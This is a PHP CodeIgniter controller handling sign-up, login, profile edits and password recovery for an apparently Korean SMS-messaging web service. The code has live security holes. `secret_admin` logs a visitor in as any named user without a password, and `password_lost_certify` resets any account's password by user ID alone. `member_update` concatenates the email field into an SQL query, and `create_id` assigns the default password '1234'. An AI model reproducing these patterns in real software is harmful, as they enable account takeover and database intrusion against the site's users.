<?php
/**
 * Author: KMC
 * Date: 10/6/15
 */

defined('BASEPATH') OR exit('No direct script access allowed');

class Join extends MY_Controller
{
    public function __construct()
    {
        parent::__construct();

        // date_default_timezone_set('Asia/Pyongyang');

        $this->data['title'] = SITE_TITLE;
        $this->data['styles'] = array(
            'include/css/log.css',
            'include/css/login.css',
            'include/css/survey.css',            
            'include/plugins/font-awesome/css/font-awesome.min.css',
            'include/plugins/bootstrap-sweetalert/sweetalert.css',
        );

        $this->data['scripts'] = array(
            'include/plugins/bootstrap-sweetalert/sweetalert.min.js'
        );
                
        $this->load->model('config_model');
        $this->load->model('msg_queue_model');
        $this->load->model('senderphone_model');
        $this->load->model('shorturls_model');

        $this->load->model('noticeprice_model');
        $this->load->model('money_model');

        $this->load->helper('form');
        $this->load->helper('signin');
        $this->load->helper('my_url');
        $this->load->library('form_validation');
        $this->load->model('users_model');
    }
        
    // public function index()
    // {
    //     $this->load->view('templates/header', $this->data);
    //     $this->load->view('templates/nav', $this->data);
    //     $condition = array(
    //         'cf_admin'=>'admin'
    //     );
    //     $this->data['result'] = array();
    //     $result = $this->config_model->get_data($condition);
    //     /*$result = $this->site_datas_model->get_data_by_key('회원가입약관');
    //     $this->data['result'][] = $result[0];
    //     $result = $this->site_datas_model->get_data_by_key('개인정보취급방침안내');
    //     $this->data['result'][] = $result[0];*/
    //     $this->data['result'] =  $result[0];
    //     $this->load->view('join/join', $this->data);

    //     $this->load->view('templates/nav-footer', $this->data);
    //     $this->load->view('templates/scripts', $this->data);
    //     $this->load->view('templates/footer', $this->data);
    // }

    public function login_view()
    {
        $this->load->view('templates/header', $this->data);
        $this->load->view('templates/nav', $this->data);

        $this->load->view('join/login', $this->data);

        $this->load->view('templates/nav-footer', $this->data);
        $this->load->view('templates/scripts', $this->data);
        $this->load->view('templates/footer', $this->data);
    }

   /* public function edit_profile()
    {
        $this->load->view('templates/header', $this->data);
        $this->load->view('templates/nav', $this->data);

        $this->load->view('join/edit_profile', $this->data);

        $this->load->view('templates/nav-footer', $this->data);
$this->load->view('templates/scripts', $this->data);
       $this->load->view('templates/footer', $this->data);
    }*/
    public function edit_profile() {

        $user_id = get_session_user_id();


            // set variables from the form
            $join_uid = $this->input->post('join_uid');
            $join_email    = $this->input->post('join_email');
            $join_password = $this->input->post('join_password');
            $join_password_confirm = $this->input->post('join_password_confirm');
            $join_captcha    = $this->input->post('join_captcha');
            $join_company = $this->input->post('join_company');
            $join_name = $this->input->post('join_name');
            $join_department    = $this->input->post('join_department');
            $join_phone = $this->input->post('join_phone');
            $join_mobile = $this->input->post('join_mobile');
            $join_fax    = $this->input->post('join_fax');
            $mobile_verify   = $this->input->post('mobile_verify');
            $is_mobile_verify    = $this->input->post('is_mobile_verify');

                    $this->data['join_uid'] = $join_uid;
                    $this->data['join_email'] = $join_email;
                    $this->data['join_password'] = $join_password;
                    $this->data['join_password_confirm'] = $join_password_confirm;
                    $this->data['join_captcha'] = $join_captcha;
                    $this->data['join_company'] = $join_company;
                    $this->data['join_name'] = $join_name;
                    $this->data['join_department'] = $join_department;
                    $this->data['join_phone'] = $join_phone;
                    $this->data['join_mobile'] = $join_mobile;
                    $this->data['join_fax'] = $join_fax;
                    $this->data['mobile_verify'] = $mobile_verify;
                    $this->data['is_mobile_verify'] = $is_mobile_verify;

                    // validation not ok, send validation errors to the view
                    $this->load->view('templates/header', $this->data);
                    $this->load->view('templates/nav', $this->data);

                    $this->load->view('join/edit_profile', $this->data);

                    $this->load->view('templates/nav-footer', $this->data);
                    $this->load->view('templates/scripts', $this->data);
                   $this->load->view('templates/footer', $this->data);




    }
    
    public function refresh_captcha(){
        $this->load->view('join/captcha');

    }

    public function check_user_id() {
        $result = 0;
        $user_id = $this->input->post('join_uid');
        $query = $this->db->get_where('g5_member', array(//making selection
            'mb_id' => $user_id
        ));
        $count = $query->num_rows(); //counting result from query
        if ($count !== 0) {
            $result = -1;
        }
        echo $result;
    }

    public function checkPhoneNumber($phoneNumber){
        //유선번호목록
        $checkResult = false;
        $phoneFilterList = [['02',7],['031',7],['032',7],['033',7],['041',7],['042',7],['042',7],['043',7],['044',7],
            ['051',7],['052',7],['053',7],['054',7],['055',7],
            ['061',7],['062',7],['063',7],['064',7],
            ['02',8],['031',8],['032',8],['033',8],['041',8],['042',8],['042',8],['043',8],['044',8],
            ['051',8],['052',8],['053',8],['054',8],['055',8],
            ['061',8],['062',8],['063',8],['064',8],
            //이동통신전화번호
            ['010',7],['011',7],['016',7],['017',7],['018',7],['019',7],
            ['010',8],['011',8],['016',8],['017',8],['018',8],['019',8],
            //대표전화번호 예) 15
            ['15',6],['16',6],['18',6],
            //공통서비스식별번호
            ['020',8],['030',8],['040',8],['050',8],['060',8],['070',8],['080',8],['090',8]
        ];

       foreach($phoneFilterList as $phone) {
           if (substr($phoneNumber,0, strlen($phone[0])) === $phone[0] && strlen($phoneNumber) === (strlen($phone[0]) + $phone[1])) {

               return true;
           };
       }
        return $checkResult;
    }

    public function pass_lost() {
            $this->load->view('templates/header', $this->data);
            $this->load->view('templates/nav', $this->data);

            $this->load->view('join/password_lost', $this->data);

            $this->load->view('templates/nav-footer', $this->data);
            $this->load->view('templates/scripts', $this->data);
           $this->load->view('templates/footer', $this->data);
    }

    public function pass_find() {
        $lost_mobile = $this->input->get_post('lost_mobile');
        $lost_mb_name = $this->input->get_post('lost_mb_name');
        $query = $this->db->get_where('g5_member', array(//making selection
            'mb_hp'=>$lost_mobile,
            'mb_name'=>$lost_mb_name
        ));
        $count = $query->num_rows(); //counting result from query
        if($count > 1){
            echo -1;
            return;

        } else if($count ==1) {
            $result = $query->result_array();
            $this->mailer($result[0]['mb_no'],$lost_mobile);
            echo 1;
            return;
        } else {
            echo -2;
            return;
        }
    }

    function mailer($mb_no,$mobile)
    {
        /*$this->load->library('MY_Mailer');*/
        // 임시비밀번호 발급
        $change_password = rand(100000, 999999);

        $encoded_password = $this->users_model->encode_password($change_password);

        $user_id = $this->users_model->insert_lost_pass_certify($mb_no,$encoded_password);
        $short_id = $this->shorturls_model->insert_data_pass($user_id['mb_no'],$change_password);

        $short_url =" ".get_short_url()."/join/lost/".base62_encode($short_id);

        $subject =" 요청하신 회원정보 찾기 안내 메일입니다.";


        $admin = $this->users_model->get_admin_data();

        $text = "아이디와 비밀번호를 찾으시려면 아래 URL을 링크하십시요\n  ".$short_url;
        $data = array(
            'user_id'=>1,
            'msg_type' => '1',
            'dstaddr' => $mobile,
            'callback' => $admin[0]['cf_admin_mobile'],
            'stat' => '0',
            'request_time' => date('Y-m-d H:i:s'),
            'text'=>$text,
            'user_msg_type'=>"103"
        );

        $result = $this->msg_queue_model->insert_data($data);
    }

    public function lost($user_id)
    {
        $id = base62_decode($user_id);
        $long_url = $this->shorturls_model->get_data_pass($id);
        if (sizeof($long_url) > 0) {


            $mobile = $long_url[0]['advert_link'];
            $mb_no = $long_url[0]['notice_id'];
            $mb_created = $long_url[0]['created'];
            $query = $this->db->get_where('g5_member', array(//making selection
                'mb_no'=>$mb_no
            ));
            $result = $query->result_array();
            if(sizeof($result)> 0){
                $this->data['mb_name'] = $result[0]['mb_name'];
                $this->data['mb_id'] = $result[0]['mb_id'];
                $this->data['mb_pass'] = $mobile;
                $this->data['mb_created'] = $mb_created;
                $this->load->view('templates/header', $this->data);
                $this->load->view('templates/nav', $this->data);

                $this->load->view('join/password_find', $this->data);

                $this->load->view('templates/nav-footer', $this->data);
                $this->load->view('templates/scripts', $this->data);
                $this->load->view('templates/footer', $this->data);
            } else {
                redirect("index");
            }

        }
    }

    public function create_id(){
        $id = $this->input->post('id');
        $name    = $this->input->post('name');
        $company = $this->input->post('company');
        $email = $this->input->post('email');

        //아이디중복검사
        $query = $this->db->get_where('g5_member', array(//making selection
            'mb_id' => $id
        ));
        $count = $query->num_rows(); //counting result from query
        if ($count !== 0)
        {
            echo -1;
            return;
        }
        $encoded_password = $this->users_model->encode_password("1234");
        $data = array(
            'mb_id' => $id,
            'mb_password' => $encoded_password,
            'mb_name' =>$name,
            'mb_nick' => $company,
            'mb_tel' => '',
            'mb_hp' => '',
            'mb_email' => $email,
            'mb_level'=>"2",
            'mb_fax'=>'',
            'mb_today_login' => date('Y-m-d H:i:s'),
            'mb_datetime' => date('Y-m-d H:i:s'),
            'mb_login_ip' => $_SERVER['REMOTE_ADDR']
        );

        $user_id = $this->users_model->insert_data($data);

        if($user_id > 0) {
            $user_infor = array(
                'user_id' =>$user_id,
                'user_uid' => $id,
                'user_nick' => $company,
                'user_name' => $name,
                'user_level'=>"2"
            );

            $this->session->set_userdata('user_infor', $user_infor);
            $this->users_model->insert_visit($_SERVER['REMOTE_ADDR'], $_SERVER['HTTP_USER_AGENT']);

            $this->createMoneyAccount($user_id);
            echo 1;
            return;
        }

    }
    
    public function join()
    {
        $join_uid = $this->input->post('join_uid');
        $join_email    = $this->input->post('join_email');
        $join_password = $this->input->post('join_password');
        $join_password_confirm = $this->input->post('join_password_confirm');
        $join_captcha    = $this->input->post('join_captcha');
        $join_company = $this->input->post('join_company');
        $join_name = $this->input->post('join_name');
        $join_department    = $this->input->post('join_department');
        $join_phone = $this->input->post('join_phone');
        $join_mobile = $this->input->post('join_mobile');
        $join_fax    = $this->input->post('join_fax');

        $encoded_password = $this->users_model->encode_password($join_password);
        $query = $this->db->get_where('g5_member', array(//making selection
            'mb_id' => $join_uid
        ));
        $count = $query->num_rows(); //counting result from query
        if ($count !== 0)
        {
            echo -1;
            return;
        }

        if($_SESSION['phrase'] !==$join_captcha){
            echo -2;
            return;
        }
        
        $query = $this->db->get_where('g5_member', array(//making selection
            'mb_email' => $join_email
        ));
        $count = $query->num_rows(); //counting result from query
        if ($count !== 0)
        {
            echo -3;
            return;
        }
        $query = $this->db->get_where('g5_member', array(//making selection
            'mb_hp' => $join_mobile,
            'mb_name'=>$join_name
        ));
        $count = $query->num_rows(); //counting result from query
        if ($count !== 0)
        {
            echo -6;
            return;
        }
        $data = array(
            'mb_id' => $join_uid,
            'mb_password' => $encoded_password,
            'mb_name' =>$join_name,
            'mb_nick' => $join_company,
            'mb_tel' => $join_phone,
            'mb_hp' => $join_mobile,
            'mb_email' => $join_email,
            'mb_level'=>"2",
            'mb_fax'=>$join_fax,
            'mb_today_login' => date('Y-m-d H:i:s'),
            'mb_datetime' => date('Y-m-d H:i:s'),
            'mb_login_ip' => $_SERVER['REMOTE_ADDR']

        );

        $user_id = $this->users_model->insert_data($data);
        if($user_id > 0) {


            $user_infor = array(
                'user_id' =>$user_id,
                'user_uid' => $join_uid,
                'user_nick' => $join_company,
                'user_name' => $join_name,
                'user_level'=>"2"
            );

            $this->session->set_userdata('user_infor', $user_infor);
            $this->users_model->insert_visit($_SERVER['REMOTE_ADDR'], $_SERVER['HTTP_USER_AGENT']);
            //새로 가입하는 회원의 휴대폰번호를 발신번호로 등록
            $now_date = date('Y-m-d H:i:s');
            $data = array(
                'user_id' => $user_id,
                'phone' => $join_mobile,
                'memo' => "",
                'request_phone' => $join_mobile,
                'request_date'=>date('Y-m-d H:i:s')
            );
            $this->senderphone_model->insert_data($data);
            $this->createMoneyAccount($user_id);
            echo 1;
            return;
        }

        echo -5;
        return -5;
    }

    //새로운 구좌만들기
    public function createMoneyAccount($userid)
    {

        if ($userid != -1) {
            $notice_price = $this->noticeprice_model->get_notice_price();
            $data = array(
                'user_id' => $userid,
                'total_deposit' => 1000,
                'current_amount' => 1000,
                'charge_type' => 0, //0:선불충전식 1: 후불정산제
                'sms_g_simple' =>$notice_price[0]['price'],
                'sms_g_attach' =>$notice_price[1]['price'],
                'sms_sur_simple' =>$notice_price[2]['price'],
                'sms_sur_attach' =>$notice_price[3]['price'],
                'lms_g_simple' =>$notice_price[4]['price'],
                'lms_g_attach' =>$notice_price[5]['price'],
                'lms_sur_simple' =>$notice_price[6]['price'],
                'lms_sur_attach' =>$notice_price[7]['price'],
                'current_count' => 0,
                'month_count' => 0,
                'charge_count' => 0,
                'expire_date' =>'9999-12-31',
            );
            $this->money_model->insert_data($data);
        }
    }

    public function register_result(){
        $this->data['user_name'] = get_session_user_name();
        $this->load->view('templates/header', $this->data);
        $this->load->view('templates/nav', $this->data);

        $this->load->view('join/register_result', $this->data);

        $this->load->view('templates/nav-footer', $this->data);
        $this->load->view('templates/scripts', $this->data);
        $this->load->view('templates/footer', $this->data);
    }

    public function login()
    {        
        $this->users_model->update_from_erp_mssql();

        $encoded_password = $this->users_model->encode_password($this->input->get_post('password'));        
        $query = $this->db->get_where('g5_member', array(//making selection
            'mb_id' => $this->input->get_post('uid'),
            'mb_password' => $encoded_password
        ));

        $count = $query->num_rows(); // counting result from query

        if ($count === 0)
        {
            echo -1;
        }
        else
        {
            $userid = $this->input->get_post('uid');
            $saveAccount = $this->input->get_post('saveAccount');
            if (empty($saveAccount))
                $saveAccount = 0;

            if ($saveAccount == 0)
                $userid = '';

            $result = $query->result_array();
            if(!empty($result[0]['mb_intercept_date'])){
                echo -2;
            } else {
                $user_infor = array(
                    'user_id' => $result[0]['mb_no'],
                    'user_uid' => $result[0]['mb_id'],
                    'user_name' => $result[0]['mb_name'],
                    'user_nick' => $result[0]['mb_nick'],
                    'user_level' => $result[0]['mb_level']
                );

                $this->session->set_userdata('user_infor', $user_infor);
                $this->users_model->insert_visit($_SERVER['REMOTE_ADDR'], $_SERVER['HTTP_USER_AGENT'], $userid);
                echo 1;
            }
        }
    }

    public function logout()
    {
        $this->session->unset_userdata('user_infor');
        redirect('index');
    }

    public function download($p_id)
    {
        $p_id = 6;
        // 내리적재 권한검사

        $this->load->helper('download');

        $base_path = $this->input->server('DOCUMENT_ROOT') . base_url();
        $file = sprintf('%suploads/questions/%d.PNG', $base_path, $p_id);
        $filename = '시험.png';
        force_download($file, NULL, FALSE, $filename);
    }
    function snowCheckMail($Email)
    {

        global $HTTP_HOST;
        $Return=false;
        $Debug=false;

        // 메일은 @를 기준으로 2개로 나눠줍니다. 만약에 $Email 이 "lsm@ebeecomm.com"이라면
        // $Username : lsm
        // $Domain : ebeecomm.com 이 저장
        // list 함수 레퍼런스 : http://www.php.net/manual/en/function.list.php
        // split 함수 레퍼런스 : http://www.php.net/manual/en/function.split.php
        $pos = strpos($Email,"@")+1;
        $Domain=substr($Email,$pos,strlen($Email));


        // 도메인에 MX(mail exchanger) 레코드가 존재하는지를 체크. 근데 영어가 맞나 모르겠네여 -_-+
        // checkdnsrr 함수 레퍼런스 : http://www.php.net/manual/en/function.checkdnsrr.php
        if ( checkdnsrr ( $Domain, "MX" ) )  {
            if($Debug) echo "확인 : {$Domain}에 대한 MX 레코드가 존재합니다.<br>";
            // 만약에 MX 레코드가 존재한다면 MX 레코드 주소를 구해옵니다.
            // getmxrr 함수 레퍼런스 : http://www.php.net/manual/en/function.getmxrr.php
            if ( getmxrr ($Domain, $MXHost))  {
                if($Debug) {
                    echo "확인 : MX LOOKUP으로 주소 확인중입니다.<br>";
                    for ( $i = 0,$j = 1; $i < count ( $MXHost ); $i++,$j++ ) {
                        echo "&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;결과($j) - $MXHost[$i]<BR>";
                    }
                }
            }
            // getmxrr 함수는 $Domain에 대한 MX 레코드 주소를 $MXHost에 배열형태로 저장시킵니다.
            // $ConnectAddress는 소켓접속을 하기위한 주소입니다.
            $ConnectAddress = $MXHost[0];
        }
        else {
            // MX 레코드가 없다면 그냥 @ 다음의 주소로 소켓접속을 합니다.
            $ConnectAddress = $Domain;
            if ($Debug) echo "확인 : {$Domain}에 대한 MX 레코드가 존재하지 않습니다.<br>";
        }

        // $ConnectAddress에 메일 포트인 25번으로 소켓 접속을 합니다.
        // fsockopen 함수 레퍼런스 : http://www.php.net/manual/en/function.fsockopen.php
        $Connect = fsockopen ( $ConnectAddress, 25 );

        // 소켓 접속에 성공
        if ($Connect)
        {
            if ($Debug) echo "{$ConnectAddress}의 SMTP에 접속 성공했습니다.<br>";
            // 접속후 문자열을 얻어와 220으로 시작해야 서비스가 준비중인 것이라 판단.
            // 220이 나올때까지 대기 처리를 하면 더 좋겠지요 ^^;
            // fgets 함수 레퍼런스 : http://www.php.net/manual/en/function.fgets.php
            if ( ereg ( "^220", $Out = fgets ( $Connect, 1024 ) ) ) {

                // 접속한 서버에게 클라이언트의 도착을 알립니다.
                fputs ( $Connect, "HELO $HTTP_HOST\r\n" );
                if ($Debug) echo "실행 : HELO $HTTP_HOST<br>";
                $Out = fgets ( $Connect, 1024 ); // 서버의 응답코드를 받아옵니다.

                // 서버에 송신자의 주소를 알려줍니다.
                fputs ( $Connect, "MAIL FROM: <{$Email}>\r\n" );
                if ($Debug) echo "실행 : MAIL FROM: &lt;{$Email}&gt;<br>";
                $From = fgets ( $Connect, 1024 ); // 서버의 응답코드를 받아옵니다.

                // 서버에 수신자의 주소를 알려줍니다.
                fputs ( $Connect, "RCPT TO: <{$Email}>\r\n" );
                if ($Debug) echo "실행 : RCPT TO: &lt;{$Email}&gt;<br>";
                $To = fgets ( $Connect, 1024 ); // 서버의 응답코드를 받아옵니다.

                // 세션을 끝내고 접속을 끝냅니다.
                fputs ( $Connect, "QUIT\r\n");
                if ($Debug) echo "실행 : QUIT<br>";

                fclose($Connect);

                // MAIL과 TO 명령에 대한 서버의 응답코드가 답긴 문자열을 체크합니다.
                // 명령어가 성공적으로 수행되지 않았다면 몬가 문제가 있는 것이겠지요.
                // 수신자의 주소에 대해서 서버는 자신의 메일 계정에 우편함이 있는지를
                // 체크해 없다면 550 코드로 반응을 합니다.
                if ( !ereg ( "^250", $From ) || !ereg ( "^250", $To )) {
                    $Return=false;
                    /*$Return[1]="${Email}은(는) 메일서버에서 허가되지 않은 주소입니다.";*/
                    if ($Debug) echo "{$ConnectAddress}에서 허가하지 않는 메일주소입니다.<br>";
                    return $Return;
                }
            }
        }
        // 소켓 접속에 실패
        else {
            $Return=false;
           /* $Return[1]="메일서버({$ConnectAddress})에 접속할 수 없습니다.";*/
            if ($Debug) echo "{$ConnectAddress}의 SMTP에 접속 실패했습니다.<br>";
            return $Return;
        }
        // 오~ 위를 모두 통과한 메일에 대해서는 맞는 메일이라고 생각하고 눈 딱 감아주져.^^;
        $Return=true;

        return $Return;
    }
    function get_phone_number(){
        $user_id = get_session_user_id();
        $phone = "";
        $phone = $this->users_model->get_phone_number($user_id);
        echo $phone;

    }
    function password_lost_certify(){

        $user_id = $this->input->get_post('mb_id');
        $result = "";
        $user_lost_pass = $this->input->get_post('join_password');

        $encoded_lost_password = $this->users_model->encode_password($user_lost_pass);

         $this->users_model->update_pass($user_id,$encoded_lost_password);
       echo 1 ;
    }

    function mobile_verify(){
        $mobile = $this->input->post('join_mobile');
       /* $query = $this->db->get_where('g5_member', array(//making selection
            'mb_hp' => $mobile
        ));

        $count = $query->num_rows(); //counting result from query
        if ($count !== 0)
        {
            echo -1;
            return;
        }*/
        $admin = $this->users_model->get_admin_data();

        $rand_num = sprintf("%04d",rand(0000,9999));
        $_SESSION['mobile_verfiy_code'] = $rand_num;
        $text = "한국생산성본부 회원정보수정을 위한 인증코드입니다.\n 인증코드 : ".$rand_num;
        $data = array(
            'user_id'=>1,
            'msg_type' => '1',
            'dstaddr' => $mobile,
            'callback' => $admin[0]['cf_admin_mobile'],
            'stat' => '0',
            'request_time' => date('Y-m-d H:i:s'),
            'text'=>$text,
            'user_msg_type'=>"100"
        );
        $result = $this->msg_queue_model->insert_data($data);
        echo 1;
    }

    function confirm_verify(){
        $verify_code = $this->input->post('verify_code');
        if($verify_code ===$_SESSION['mobile_verfiy_code']) {
            echo 1;
        } else {
            echo 0;
        }
    }
    public function secret_admin($user_id){
        $condition = array(
            'mb_id'=>$user_id
        );
        $users = $this->users_model->get_data($condition);
        if($users[0] !==null) {
            $this->session->unset_userdata('user_infor');
            $user_infor = array(
                'user_id' => $users[0]['mb_no'],
                'user_uid' => $users[0]['mb_id'],
                'user_name' => $users[0]['mb_name'],
                'user_nick' => $users[0]['mb_nick'],
                'user_level' => $users[0]['mb_level']
            );

            $this->session->set_userdata('user_infor', $user_infor);
            redirect('index');
        }
    }

    function word_filter_check($content, $config)
    {

        $mod_subject = strtolower($content);
        $filter = explode(",", trim($config));
        $count = count($filter);
        $error = '';

        for ($i=0; $i<$count; $i++) {
            $str = $filter[$i];

            $pos = strpos($mod_subject, $str);

            if ($pos !== false) {

                $error .= '제목에 금지단어(\''.$str.'\')가 포함되어있습니다.';

                break;

            }
        }
        return $error;
    }
    /*function userid_word_check(){
        $user_id = $this->input->post('user_id');
        $error = "";
        $condition = array(
            'cf_admin'=>'admin'
        );
        $config = $this->config_model->get_data($condition);
        $error = word_filter_check($error, $config[0]['cf_'])
    }*/
   public function member_update_view() {
       if (is_signed()) {
            $mb_id = get_session_user_uid();
            if(empty($mb_id)){
                redirect("index");
            }
            $query = $this->db->get_where('g5_member', array(//making selection
                'mb_id' => $mb_id
            ));
            $member_result = $query->result_array();
            if(sizeof($member_result) > 0) {
                $join_uid = $member_result[0]['mb_id'];
                $join_email    = $member_result[0]['mb_email'];


                $join_company = $member_result[0]['mb_nick'];
                $join_name = $member_result[0]['mb_name'];

                $join_phone = $member_result[0]['mb_tel'];
                $join_mobile = $member_result[0]['mb_hp'];
                $join_fax    =$member_result[0]['mb_fax'];

                $this->data['join_uid'] = $join_uid;
                $this->data['join_email'] = $join_email;
                $this->data['join_password'] = "";

                $this->data['join_password_confirm'] = "";
                $this->data['join_captcha'] = "";
                $this->data['join_company'] = $join_company;
                $this->data['join_name'] = $join_name;
                $this->data['join_department'] = "";
                $this->data['join_phone'] = $join_phone;
                $this->data['join_mobile'] = $join_mobile;
                $this->data['join_fax'] = $join_fax;
                $this->data['mobile_verify'] = "";
                $this->data['is_mobile_verify'] = "1";
                $this->data['menu'] = 'My Page';
                $this->data['submenu'] = '회원정보 수정'; 

                // validation not ok, send validation errors to the view
                $this->load->view('templates/header', $this->data);
                $this->load->view('templates/nav', $this->data);

                $this->load->view('join/member_update', $this->data);

                $this->load->view('templates/nav-footer', $this->data);
                $this->load->view('templates/scripts', $this->data);
                $this->load->view('templates/footer', $this->data);
            }
       }
       else {
            ?>
            <script type="text/javascript">                
                alert("로그인상태에서만 이용하실수 있습니다.");
                base_url = "<?=$GLOBALS['protocol']?>://" + location.host + "/index";
                window.location = base_url;
            </script>
            <?php       
       }
   }
   
    public function member_update()
    {
        $join_uid = $this->input->post('join_uid');
        $join_email    = $this->input->post('join_email');
        $join_password = $this->input->post('join_password');

        $join_captcha    = $this->input->post('join_captcha');
        $join_company = $this->input->post('join_company');
        $join_name = $this->input->post('join_name');

        $join_phone = $this->input->post('join_phone');
        $join_mobile = $this->input->post('join_mobile');
        $join_mobile_verify = $this->input->post('join_mobile_verify');
        $join_fax    = $this->input->post('join_fax');
        
        $query = $this->db->get_where('g5_member', array(//making selection
            'mb_id' => $join_uid
        ));
        $count = $query->num_rows(); //counting result from query
        $encoded_password = $this->users_model->encode_password($join_password);
        if ($count == 0)
        {
            echo -1;
            return;
        } else {
            $result = $query->result_array();
            if($encoded_password !== $result[0]['mb_password']){
               echo -4;
               return;
            }
        }
        if($_SESSION['phrase'] !==$join_captcha){
            echo -2;
            return;
        }

        if($join_mobile_verify !== $_SESSION['mobile_verfiy_code']) {
            echo -5;
            return;
        }

        $sql = "select * from g5_member where mb_email='".$join_email."' and mb_id <>'".$join_uid."'";
        $query = $this->db->query($sql);
        $count = $query->num_rows(); //counting result from query
        if ($count !== 0)
        {
            echo -3;
            return;
        }

        $data = array(
            'mb_name' =>$join_name,
            'mb_nick' => $join_company,
            'mb_tel' => $join_phone,
            'mb_hp' => $join_mobile,
            'mb_email' => $join_email,
            'mb_level'=>"2",
            'mb_fax'=>$join_fax
        );

        $w = array(
          'mb_id'=>$join_uid
        );

        $this->users_model->update_data($data,$w);
        $this->users_model->update_erp_edumanager($data, $join_uid, 0);

        echo 1;
        return 1;
    }

    public function change_password_view(){
        $mb_id = get_session_user_uid();
        if(empty($mb_id)){
            redirect("index");
        }

        $query = $this->db->get_where('g5_member', array(//making selection
            'mb_id' => $mb_id
        ));

        $member_result = $query->result_array();
        if(sizeof($member_result) > 0) {
            $join_uid = $member_result[0]['mb_id'];
            $this->data['join_uid'] = $join_uid;
            $this->data['join_password'] = "";
            $this->data['new_join_password'] = "";
            $this->data['new_join_password_confirm'] = "";

            // validation not ok, send validation errors to the view
            $this->load->view('templates/header', $this->data);
            $this->load->view('templates/nav', $this->data);

            $this->load->view('join/change_password', $this->data);

            $this->load->view('templates/nav-footer', $this->data);
            $this->load->view('templates/scripts', $this->data);
            $this->load->view('templates/footer', $this->data);
        }
    }

    public function change_password(){
        $join_uid = $this->input->post('join_uid');
        $join_password = $this->input->post('join_password');
        $join_captcha    = $this->input->post('join_captcha');
        $new_join_password = $this->input->post('new_join_password');

        $encoded_oldpassword = $this->users_model->encode_password($join_password);        
        $encoded_newpassword = $this->users_model->encode_password($new_join_password);

        $query = $this->db->get_where('g5_member', array(//making selection
            'mb_id' => $join_uid
        ));
        $count = $query->num_rows(); //counting result from query
        if ($count == 0)
        {
            echo -1;
            return;
        } else {
            $result = $query->result_array();
            if($encoded_oldpassword !==$result[0]['mb_password']){
                echo -4;
                return;
            }
        }
        if($_SESSION['phrase'] !==$join_captcha){
            echo -2;
            return;
        }
        $data = array(
            'mb_password' =>$encoded_newpassword
        );

        $w = array(
            'mb_id'=>$join_uid
        );
        $this->users_model->update_data($data,$w);
        // $this->users_model->update_erp_edumanager($data, $join_uid, 1);
        echo 1;
        return 1;
    }
}

/* End of file home.php */
/* Location: ./application/controllers/Home.php */
